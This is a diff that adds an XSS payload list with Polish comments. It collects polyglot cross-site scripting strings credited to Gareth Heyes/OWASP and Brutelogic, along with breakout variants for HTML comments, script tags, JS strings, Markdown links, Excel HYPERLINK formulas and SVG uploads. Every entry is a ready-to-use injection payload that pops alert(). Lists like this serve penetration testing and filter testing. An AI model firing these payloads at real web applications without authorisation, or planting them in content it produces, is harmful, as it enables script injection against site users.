@@ -1,0 +1,30 @@
+# === Gareth Heyes / OWASP XSS Polyglot ===
+# Klasyczny multi-context polyglot — działa w 26+ kontekstach
+jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */oNcliCk=alert() )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\x3csVg/<sVg/oNloAd=alert()//>\x3e
+
+# === Brutelogic short polyglot ===
+# Krótszy, działa w HTML body + atrybut + JS string
+"><svg onload=alert(1)>"-alert(1)-"
+
+# === Comment-breaker polyglot ===
+# Wybija się z HTML comment + JS comment + atrybutu
+--><svg onload=alert(1)>
+*/alert(1)/*
+*/</script><svg onload=alert(1)>
+
+# === RPo / relative path overwrite friendly ===
+'"--></style></script><script>alert(1)</script>
+
+# === JS string + HTML breakout ===
+\';alert(1);//<svg onload=alert(1)>
+
+# === Markdown context (gdy aplikacja renderuje MD) ===
+[xss](javascript:alert(1))
+![xss](javascript:alert(1))
+
+# === CSV injection (Excel formulas) — XSS-pokrewne ===
+=HYPERLINK("javascript:alert(1)","click")
+
+# === SVG file-upload polyglot ===
+# Wgrany jako .svg, renderowany w <img src> nie odpala — w <object> tak
+<svg xmlns="http://www.w3.org/2000/svg" onload="alert(1)"/>
